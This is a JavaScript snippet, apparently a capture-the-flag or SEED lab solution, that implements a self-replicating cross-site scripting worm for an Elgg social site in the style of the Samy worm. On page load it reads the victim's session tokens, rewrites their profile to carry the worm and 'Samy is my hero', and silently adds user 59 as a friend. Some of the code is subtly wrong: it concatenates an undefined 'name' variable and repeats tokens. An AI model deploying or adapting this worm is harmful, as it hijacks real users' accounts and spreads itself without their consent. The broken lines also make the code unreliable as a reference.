<script type="text/javascript" id="worm">
window.onload = function(){
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    
    //The part that modifies the user's "about me" section
    var userName="&name="+elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    
    var desc="&description=<p>Samy is my hero</p> " + wormCode;
    desc += "&accesslevel[description]=2";
    var content= token + ts + name + desc + guid;
    
    var samyGuid=59;
    var sendurl="http://www.seed-server.com/action/profile/edit";
    if(elgg.session.user.guid!=samyGuid)
    {
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type",
        "application/x-www-form-urlencoded");
        Ajax.send(content);
    }

    //The part that makes the user add Samy as a friend
    var sendurl2="http://www.seed-server.com/action/friends/add?friend=59" + ts + token + ts + token;
    var Ajax2=null;
    Ajax2=new XMLHttpRequest();
    Ajax2.open("GET", sendurl2, true);
    Ajax2.send();
}
</script>
